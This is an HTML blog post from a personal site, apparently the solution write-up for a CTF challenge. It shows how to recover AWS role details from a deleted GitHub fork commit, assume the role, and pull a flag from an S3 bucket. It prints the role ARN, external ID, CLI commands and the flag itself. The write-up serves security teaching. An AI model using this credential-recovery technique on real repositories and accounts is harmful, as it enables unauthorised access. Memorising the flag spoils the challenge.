@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Shadow | Husain Challawala</title>
+  <link rel="stylesheet" href="../style.css" />
+</head>
+<body>
+  <header>
+    <nav class="navbar">
+      <div class="logo">Husain Challawala</div>
+      <ul class="nav-links">
+        <li><a href="../index.html">Home</a></li>
+        <li><a href="../projects.html">Projects</a></li>
+        <li><a href="../blog.html">Blog</a></li>
+        <li><a href="../contact.html">Contact</a></li>
+      </ul>
+      <div class="menu-toggle" id="mobile-menu">&#9776;</div>
+    </nav>
+  </header>
+
+  <main class="section blog-post">
+    <div class="container">
+      <article>
+        <div class="blog-post-header">
+          <h1>Shadow</h1>
+          <p class="blog-meta">Published on March 2026</p>
+        </div>
+
+        <div class="blog-post-content">
+          <h1>Solution</h1>
+<p>Entry point for the challenge is the public-facing repository https://github.com/CommitDust-oss</p>
+<p>At first glance, the repository looks like a simple utility project, nothing suspicious.  
+However, deeper inspection into its past reveals traces of a <strong>deleted fork</strong> that once contained sensitive AWS credentials embedded in a commit.</p>
+<p>The mission is to recover those credentials and use them to retrieve the flag from an AWS S3 bucket.</p>
+<hr>
+<h2>Step 1: Finding the Breadcrumb</h2>
+<p>Players look around the Github user and find a repo named Bucket-World. Further, they can find a comment in a PR in that repo at https://github.com/CommitDust-oss/Bucket-World/pull/1</p>
+<p>Here the short sha commit is exposed:
+"Additionally, double check if 471f993 from my fork of ember-cli-deploy-s3 is gone or not!"</p>
+<p>The players can also go to the gist https://gist.github.com/CommitDust-oss which mention the s3 bucket name that needs to be used later.</p>
+<p>This hint suggests that an earlier fork once had a commit that was later deleted or force-pushed away.  
+Even though the fork was removed, <strong>GitHub's backend may still store the underlying Git objects</strong>.</p>
+<hr>
+<h2>Step 2: Retrieving the Deleted Commit</h2>
+<p>Players can go to the ember-cli-deploy github profile and within the ember-cli-deploy-s3 repo, they can look for the commit like:</p>
+<p>https://github.com/ember-cli-deploy/ember-cli-deploy-s3/commit/471f993</p>
+<p>This shows a file containing base64 content holds encoded AWS data.</p>
+<hr>
+<h2>Step 3: Extracting the Blob Content</h2>
+<p>Once decoded, these represent AWS Access Keys and Secret Keys for a temporary IAM user or role.</p>
+<pre><code class="language-sh">{
+  "type": "ctf-temp-role",
+  "role_arn": "arn:aws:iam::972918601805:role/ctf-github-leak-role",
+  "external_id": "githubShadow",
+  "aws_region": "us-west-2",
+  "hint": "buckets are cool"
+}
+</code></pre>
+<h2>Step 4: Assume the IAM role</h2>
+<p>Now that you have the role_arn and external_id, use aws sts assume-role to get temporary credentials.</p>
+<pre><code class="language-sh">aws sts assume-role --role-arn arn:aws:iam::972918601805:role/ctf-github-leak-role --role-session-name CTFTestSession --external-id githubShadow
+</code></pre>
+<p>This will provide an output like:</p>
+<pre><code>    "AccessKeyId": "...",
+    "SecretAccessKey": "...",
+    "SessionToken": "...."
+</code></pre>
+<h2>Step 5: Authenticating with AWS</h2>
+<p>Export the credentials in your shell:</p>
+<pre><code class="language-sh">export AWS_ACCESS_KEY_ID=&lt;access_key&gt;
+export AWS_SECRET_ACCESS_KEY=&lt;secret_key&gt;
+export AWS_SESSION_TOKEN=&lt;session_token&gt;
+</code></pre>
+<p>Verify that the credentials work:</p>
+<pre><code class="language-sh">aws sts get-caller-identity
+</code></pre>
+<p>Expected output:</p>
+<pre><code>{
+    "UserId": "...",
+    "Account": "...",
+    "Arn": "arn:aws:sts::872101052618:assumed-role/CTFReadOnlyS3/CTFSession"
+}
+</code></pre>
+<h2>Step 6: Discovering the S3 Bucket</h2>
+<p>Hints in the repository (issues, gists, or commit comments) mention "logs from the CI deployment" or "check app-startup logs."
+This points you toward the bucket name:</p>
+<pre><code class="language-sh">app-startup-logs
+</code></pre>
+<p>List the bucket to confirm access:</p>
+<pre><code class="language-sh">aws s3 ls s3://app-startup-logs/
+</code></pre>
+<h2>Step 7: Retrieving the Flag</h2>
+<p>Now, download the flag:</p>
+<pre><code class="language-sh">aws s3 cp s3://app-startup-logs/flag.log .
+cat flag.log
+</code></pre>
+<p>Output:</p>
+<pre><code>FLAG-{gefaCCUi31RFCcqNHFD5d8r3VgRVrv3r}
+</code></pre>
+<p>The purpose of the exercise is to demonstrate how sensitive data can persist even after deletion from Git history or repository forks.</p>
+<p>The S3 bucket policy limits users to s3:ListBucket and s3:GetObject on a single resource, ensuring no write or privilege escalation is possible.</p>
+        </div>
+      </article>
+    </div>
+  </main>
+
+  <footer>
+    <p>© 2026 Husain Challawala. All rights reserved.</p>
+  </footer>
+
+  <script src="../script.js"></script>
+</body>
+</html>
